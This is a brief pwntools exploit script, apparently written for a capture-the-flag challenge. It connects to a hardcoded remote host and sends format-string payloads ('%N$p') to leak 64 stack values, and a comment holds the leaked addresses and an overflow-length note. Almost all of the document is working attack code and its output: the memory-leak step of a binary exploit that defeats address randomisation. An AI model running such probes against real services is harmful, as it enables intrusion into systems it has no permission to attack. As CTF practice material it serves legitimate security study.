from pwn import *

ip, port = '165.22.122.247', 31683
io = remote(ip, port)

def detect():
        for i in range(64):
                io.recvuntil('>')
                io.sendline(b'%'+str(i+1).encode()+b'$p')
                buf = io.recvline().decode().strip().split(' ')[0]
                print(str(i+1)+' : '+buf)

detect()

'''
1 : 0x6e
2 : 0xfffffff4
3 : 0x10
4 : 0x1d
5 : 0x7f7433b664c0
6 : 0x7fff31cddfb8
7 : 0x100000000
8 : 0xa70243825
9 : (nil)
10 : 0x7fff00000000
11 : 0x100000000
12 : 0x556ca069e400
13 : 0x7f7433571bf7
14 : 0x1
15 : 0x7fff31cddfb8
16 : 0x100008000
17 : 0x556ca069e2ef
18 : (nil)
19 : 0x585531379ff23ebb
20 : 0x556ca069e160
21 : 0x7fff31cddfb0
22 : (nil)
23 : (nil)
24 : 0xd72127fea323ebb
25 : 0xc64174a60ac3ebb
26 : 0x7fff00000000
27 : (nil)
28 : (nil)
29 : 0x7f74339518d3
30 : 0x7f7433937638
31 : 0x7b1fd
32 : (nil)
33 : (nil)
34 : (nil)
35 : 0x556ca069e160
36 : 0x7fff31cddfb0
37 : 0x556ca069e18e
38 : 0x7fff31cddfa8
39 : 0x1c
40 : 0x1
41 : 0x7fff31cdeea7
42 : (nil)
43 : 0x7fff31cdeeb2
44 : 0x7fff31cdeeba
45 : 0x7fff31cdeeca
'''
#overflow length 64


